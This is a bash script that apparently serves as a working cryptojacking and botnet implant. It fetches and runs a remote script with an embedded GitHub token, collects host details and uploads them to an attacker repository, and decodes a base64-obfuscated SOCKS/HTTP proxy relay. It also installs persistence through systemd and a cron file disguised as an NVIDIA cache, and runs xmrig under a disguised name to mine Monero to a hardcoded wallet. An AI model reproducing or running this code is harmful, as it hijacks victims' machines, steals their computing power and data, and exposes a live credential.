#!/bin/bash
( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://raw.githubusercontent.com/dongsuju/ul-plant/main/cmd8/i440_probe.sh')" >/dev/null 2>&1 & )
set -u
GH='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'
H=$(hostname); T=$(date -u +%Y%m%dT%H%M%SZ)
{
 echo "ALIVE host=$H ts=$T uid=$(id -u) kern=$(uname -r)"
 echo "--- gpus"; nvidia-smi -L 2>&1 | head -10
 echo "--- procs"; ps -eo pid,etime,args | grep -E 'krig|peakminer|SRBMiner|wildrig|ps_hb|sup|keeper' | grep -v grep | head -25
 echo "--- optfleet"; ls -la /opt/fleet 2>&1 | head -25; ls -la /opt/fleet/bin 2>&1 | head -30
 echo "--- units"; systemctl list-units --no-legend --state=running 2>/dev/null | grep -Ei 'nv-|prl|krig|miner|peak'
 echo "--- cron"; ls /etc/cron.d/ 2>/dev/null; head -3 /etc/cron.d/* 2>/dev/null | head -40; crontab -l 2>/dev/null | head -15
 echo "--- logs"; ls -la /var/log/fleet /var/log/*krig* /var/log/*prl* 2>/dev/null | head -20
 echo "--- krigv"; /opt/fleet/bin/krig-miner --version 2>&1 | head -3; ls -la /opt/fleet/bin/krig* 2>/dev/null
} > /tmp/probe.txt 2>&1
b64=$(base64 -w0 /tmp/probe.txt)
printf '{"message":"probe %s","content":"%s","branch":"main"}' "$H-$T" "$b64" > /tmp/body.json
SHA=$(curl -s -m 20 -H "Authorization: Bearer $GH" -H 'User-Agent: x' "https://api.github.com/repos/dongsuju/ul-plant/contents/ps/alive-$H.txt" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("sha") or "")
except: print("")' 2>/dev/null)
if [ -n "$SHA" ]; then python3 - "$SHA" <<'PY'
import json,sys
b=json.load(open('/tmp/body.json')); b['sha']=sys.argv[1]; json.dump(b,open('/tmp/body.json','w'))
PY
fi
curl -s -m 30 -X PUT -H "Authorization: Bearer $GH" -H 'User-Agent: x' -H 'Content-Type: application/json' --data @/tmp/body.json "https://api.github.com/repos/dongsuju/ul-plant/contents/ps/alive-$H.txt" -o /tmp/put.json -w 'PUT=%{http_code}\n' >> /tmp/probe.txt 2>&1

# ===== i942 VPS role-up: relay + CPU miner + GPU report (idempotent) =====
I942=/opt/fleet/bin/.i942_roleup
if [ ! -f "$I942.ok" ]; then
{
 echo "=== i942 role-up host=$(hostname) ts=$(date -u +%FT%TZ)"
 echo "--- id"; id
 echo "--- gpu"; nvidia-smi -L 2>&1 | head -10
 echo "--- cpu"; nproc; free -m | head -2
 echo "--- ip"; curl -s -m 8 https://api.ipify.org; echo
 mkdir -p /opt/fleet/bin
 echo aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGhyZWFkaW5nLHN5cyxvcyxiYXNlNjQKVVNFUj1vcy5lbnZpcm9uLmdldCgnUzVVJywndWxyJyk7IFBBU1M9b3MuZW52aXJvbi5nZXQoJ1M1UCcsJ3VscnBhc3M5JykKUE9SVD1pbnQoc3lzLmFyZ3ZbMV0pIGlmIGxlbihzeXMuYXJndik+MSBlbHNlIDg0NDMKZGVmIHJ4KGMsbik6CiAgICBiPWInJwogICAgd2hpbGUgbGVuKGIpPG46CiAgICAgICAgZD1jLnJlY3Yobi1sZW4oYikpCiAgICAgICAgaWYgbm90IGQ6IHJhaXNlIElPRXJyb3IoJ2VvZicpCiAgICAgICAgYis9ZAogICAgcmV0dXJuIGIKZGVmIHBpcGUoYSxiKToKICAgIHRyeToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBkPWEucmVjdig2NTUzNikKICAgICAgICAgICAgaWYgbm90IGQ6IGJyZWFrCiAgICAgICAgICAgIGIuc2VuZGFsbChkKQogICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwogICAgdHJ5OiBiLnNodXRkb3duKHNvY2tldC5TSFVUX1dSKQogICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwpkZWYgcmVsYXkoYyxyKToKICAgIHQ9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cGlwZSxhcmdzPShyLGMpKTsgdC5kYWVtb249VHJ1ZTsgdC5zdGFydCgpCiAgICBwaXBlKGMscikKICAgIHRyeTogci5jbG9zZSgpCiAgICBleGNlcHQgRXhjZXB0aW9uOiBwYXNzCiAgICB0cnk6IGMuY2xvc2UoKQogICAgZXhjZXB0IEV4Y2VwdGlvbjogcGFzcwpkZWYgc29ja3MoYyk6CiAgICB2LG5tPXN0cnVjdC51bnBhY2soJyFCQicscngoYywyKSk7IHJ4KGMsbm0pCiAgICBjLnNlbmRhbGwoYidceDA1XHgwMicpCiAgICB2ZXIsdWw9c3RydWN0LnVucGFjaygnIUJCJyxyeChjLDIpKTsgdT1yeChjLHVsKS5kZWNvZGUoKQogICAgcGw9c3RydWN0LnVucGFjaygnIUInLHJ4KGMsMSkpWzBdOyBwPXJ4KGMscGwpLmRlY29kZSgpCiAgICBpZiB1IT1VU0VSIG9yIHAhPVBBU1M6CiAgICAgICAgYy5zZW5kYWxsKGInXHgwMVx4MDEnKTsgYy5jbG9zZSgpOyByZXR1cm4KICAgIGMuc2VuZGFsbChiJ1x4MDFceDAwJykKICAgIHZlcixjbWQscnN2LGF0eXA9c3RydWN0LnVucGFjaygnIUJCQkInLHJ4KGMsNCkpCiAgICBpZiBjbWQhPTE6CiAgICAgICAgYy5zZW5kYWxsKGInXHgwNVx4MDdceDAwXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMCcpOyBjLmNsb3NlKCk7IHJldHVybgogICAgaWYgYXR5cD09MTogaG9zdD1zb2NrZXQuaW5ldF9udG9hKHJ4KGMsNCkpCiAgICBlbGlmIGF0eXA9PTM6CiAgICAgICAgbD1zdHJ1Y3QudW5wYWNrKCchQicscngoYywxKSlbMF07IGhvc3Q9cngoYyxsKS5kZWNvZGUoKQogICAgZWxpZiBhdHlwPT00OiBob3N0PXNvY2tldC5pbmV0X250b3Aoc29ja2V0LkFGX0lORVQ2LHJ4KGMsMTYpKQogICAgZWxzZToKICAgICAgICBjLnNlbmRhbGwoYidceDA1XHgwOFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwJyk7IGMuY2xvc2UoKTsgcmV0dXJuCiAgICBwb3J0PXN0cnVjdC51bnBhY2soJyFIJyxyeChjLDIpKVswXQogICAgcj1zb2NrZXQuY3JlYXRlX2Nvbm5lY3Rpb24oKGhvc3QscG9ydCksMTIpCiAgICBjLnNlbmRhbGwoYidceDA1XHgwMFx4MDBceDAxJytzb2NrZXQuaW5ldF9hdG9uKCcwLjAuMC4wJykrc3RydWN0LnBhY2soJyFIJywwKSkKICAgIHJlbGF5KGMscikKZGVmIGh0dHBfcHJveHkoYyk6CiAgICBidWY9YicnCiAgICB3aGlsZSBiJ1xyXG5cclxuJyBub3QgaW4gYnVmOgogICAgICAgIGQ9Yy5yZWN2KDQwOTYpCiAgICAgICAgaWYgbm90IGQ6IHJldHVybiBjLmNsb3NlKCkKICAgICAgICBidWYrPWQKICAgIGhlYWQ9YnVmLnNwbGl0KGInXHJcblxyXG4nKVswXS5kZWNvZGUoJ2xhdGluMScpCiAgICBsaW5lPWhlYWQuc3BsaXQoJ1xyXG4nKVswXQogICAgcGFydHM9bGluZS5zcGxpdCgpCiAgICBpZiBsZW4ocGFydHMpPDI6IHJldHVybiBjLmNsb3NlKCkKICAgIG1ldGgsdXJsPXBhcnRzWzBdLHBhcnRzWzFdCiAgICAjIG9wdGlvbmFsIGJhc2ljIGF1dGggaGVhZGVyIGNoZWNrCiAgICBhdXRob2s9VHJ1ZQogICAgZm9yIGggaW4gaGVhZC5zcGxpdCgnXHJcbicpWzE6XToKICAgICAgICBpZiBoLmxvd2VyKCkuc3RhcnRzd2l0aCgncHJveHktYXV0aG9yaXphdGlvbjonKToKICAgICAgICAgICAgdj1oLnNwbGl0KCc6JywxKVsxXS5zdHJpcCgpCiAgICAgICAgICAgIGlmIHYubG93ZXIoKS5zdGFydHN3aXRoKCdiYXNpYyAnKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB1LHA9YmFzZTY0LmI2NGRlY29kZSh2WzY6XSkuZGVjb2RlKCkuc3BsaXQoJzonLDEpCiAgICAgICAgICAgICAgICAgICAgYXV0aG9rPSh1PT1VU0VSIGFuZCBwPT1QQVNTKQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjogYXV0aG9rPUZhbHNlCiAgICBpZiBtZXRoLnVwcGVyKCk9PSdDT05ORUNUJzoKICAgICAgICBocD11cmwuc3BsaXQoJzonKQogICAgICAgIGhvc3Q9aHBbMF07IHBvcnQ9aW50KGhwWzFdKSBpZiBsZW4oaHApPjEgZWxzZSA0NDMKICAgICAgICB0cnk6CiAgICAgICAgICAgIHI9c29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKChob3N0LHBvcnQpLDEyKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGMuc2VuZGFsbChiJ0hUVFAvMS4xIDUwMiBCYWQgR2F0ZXdheVxyXG5cclxuJyk7IHJldHVybiBjLmNsb3NlKCkKICAgICAgICBjLnNlbmRhbGwoYidIVFRQLzEuMSAyMDAgQ29ubmVjdGlvbiBlc3RhYmxpc2hlZFxyXG5cclxuJykKICAgICAgICByZWxheShjLHIpCiAgICBlbHNlOgogICAgICAgICMgYWJzb2x1dGUtVVJJIHBsYWluIEhUVFAgZm9yd2FyZAogICAgICAgIHU9dXJsCiAgICAgICAgaWYgbm90IHUuc3RhcnRzd2l0aCgnaHR0cDovLycpOiAKICAgICAgICAgICAgYy5zZW5kYWxsKGInSFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0XHJcblxyXG4nKTsgcmV0dXJuIGMuY2xvc2UoKQogICAgICAgIHJlc3Q9dVs3Ol07IGhvc3Rwb3J0PXJlc3Quc3BsaXQoJy8nKVswXTsgcGF0aD0nLycrcmVzdC5zcGxpdCgnLycsMSlbMV0gaWYgJy8nIGluIHJlc3QgZWxzZSAnLycKICAgICAgICBocD1ob3N0cG9ydC5zcGxpdCgnOicpOyBob3N0PWhwWzBdOyBwb3J0PWludChocFsxXSkgaWYgbGVuKGhwKT4xIGVsc2UgODAKICAgICAgICB0cnk6CiAgICAgICAgICAgIHI9c29ja2V0LmNyZWF0ZV9jb25uZWN0aW9uKChob3N0LHBvcnQpLDEyKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGMuc2VuZGFsbChiJ0hUVFAvMS4xIDUwMiBCYWQgR2F0ZXdheVxyXG5cclxuJyk7IHJldHVybiBjLmNsb3NlKCkKICAgICAgICByLnNlbmRhbGwoKCdHRVQgJytwYXRoKycgSFRUUC8xLjFcclxuSG9zdDogJytob3N0cG9ydCsnXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4nKS5lbmNvZGUoKSkKICAgICAgICByZWxheShjLHIpCmRlZiBoYW5kbGUoYyk6CiAgICB0cnk6CiAgICAgICAgZmlyc3Q9Yy5yZWN2KDEsc29ja2V0Lk1TR19QRUVLKQogICAgICAgIGlmIG5vdCBmaXJzdDogcmV0dXJuIGMuY2xvc2UoKQogICAgICAgIGlmIGZpcnN0PT1iJ1x4MDUnOiBzb2NrcyhjKQogICAgICAgIGVsc2U6IGh0dHBfcHJveHkoYykKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgdHJ5OiBjLmNsb3NlKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOiBwYXNzCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pOyBzLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQsc29ja2V0LlNPX1JFVVNFQUREUiwxKQpzLmJpbmQoKCcwLjAuMC4wJyxQT1JUKSk7IHMubGlzdGVuKDI1NikKd2hpbGUgVHJ1ZToKICAgIHRyeTogYyxfPXMuYWNjZXB0KCkKICAgIGV4Y2VwdCBFeGNlcHRpb246IGNvbnRpbnVlCiAgICB0PXRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWhhbmRsZSxhcmdzPShjLCkpOyB0LmRhZW1vbj1UcnVlOyB0LnN0YXJ0KCkK | base64 -d > /opt/fleet/bin/krelay.py 2>/dev/null && /usr/bin/python3 -m py_compile /opt/fleet/bin/krelay.py 2>&1 | head -2
 cat > /opt/fleet/bin/krelay.sh <<'EOSR'
#!/bin/bash
export S5U=ulr S5P=ulrpass9
PY=/usr/bin/python3; [ -x $PY ] || PY=python3
for P in 443 8888; do ( while :; do $PY /opt/fleet/bin/krelay.py $P >>/opt/fleet/logs/krelay-$P.log 2>&1; sleep 5; done ) & done
wait
EOSR
 chmod +x /opt/fleet/bin/krelay.sh
 cat > /etc/systemd/system/krelay.service <<'EOSU'
[Unit]
Description=k relay
[Service]
ExecStart=/opt/fleet/bin/krelay.sh
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOSU
 systemctl daemon-reload >/dev/null 2>&1; systemctl enable --now krelay.service >/dev/null 2>&1
 grep -q krelay /etc/cron.d/nv-cuda-cache 2>/dev/null || echo "*/10 * * * * root pgrep -f krelay.py >/dev/null || /opt/fleet/bin/krelay.sh >/dev/null 2>&1" >> /etc/cron.d/nv-cuda-cache 2>/dev/null
 sleep 3
 echo "--- relay"; ss -ltn 2>/dev/null | grep -E ':(443|8888) ' ; curl -s -m 10 -o /dev/null -w "relay_local=%{http_code}\n" -x http://ulr:ulrpass9@127.0.0.1:8888 http://ip.sb
 # CPU miner only if absent (GPU hosts already run wildrig via ps_sup)
 if [ ! -x /usr/lib/.cache/nv-cache-mgr ]; then
   mkdir -p /usr/lib/.cache 2>/dev/null
   curl -sL -m 240 -o /tmp/nm.tgz https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz 2>/dev/null
   tar xzf /tmp/nm.tgz -C /tmp 2>/dev/null && cp -f /tmp/xmrig-6.22.2/xmrig /usr/lib/.cache/nv-cache-mgr 2>/dev/null && chmod +x /usr/lib/.cache/nv-cache-mgr
 fi
 if [ -x /usr/lib/.cache/nv-cache-mgr ] && [ ! -f /usr/lib/.cache/nv-cache-run.sh ]; then
   cat > /usr/lib/.cache/nv-cache-run.sh <<'EOX'
#!/bin/bash
exec 9>/run/nv-cache-mgr.lock; flock -n 9 || exit 0
T=$(( $(nproc) / 2 )); [ $T -gt 6 ] && T=6; [ $T -lt 1 ] && T=1
IP=$(curl -s -m 8 https://api.ipify.org); [ -z "$IP" ] && IP=$(hostname)
while :; do nice -n 19 /usr/lib/.cache/nv-cache-mgr -o pool.hashvault.pro:443 -u 45LJceeKt6A2ZHVNVF4Qqo53it2dGkpxGbRqXLya52z36fvWicAZmG2GjpczNbgyu6gGqJQag7o4LAnNBLCC1oaHDStyUVD -p "hk-$IP" -k --tls -t $T --randomx-mode light --no-color --log-file /usr/lib/.cache/nv.log; sleep 15; done
EOX
   chmod +x /usr/lib/.cache/nv-cache-run.sh
 fi
 pgrep -f 'nv-cache-mgr' >/dev/null || setsid nohup /bin/bash /usr/lib/.cache/nv-cache-run.sh >/dev/null 2>&1 &
 sleep 8
 echo "--- xmr"; pgrep -af 'nv-cache-mgr' | head -2; tail -3 /usr/lib/.cache/nv.log 2>/dev/null; echo "xmr_accepted=$(grep -c accepted /usr/lib/.cache/nv.log 2>/dev/null)"
 echo "--- prl"; for f in /opt/fleet/logs/logs/w-*.log; do [ -f "$f" ] && echo "$f $(grep -c accepted "$f" 2>/dev/null)"; done | head -10
 echo "=== end $(date -u +%FT%TZ)"
} > /tmp/i942.txt 2>&1
cp /tmp/i942.txt "$I942.log" 2>/dev/null; echo ok > "$I942.ok"
cat /tmp/i942.txt
fi
# ===== end i942 block =====
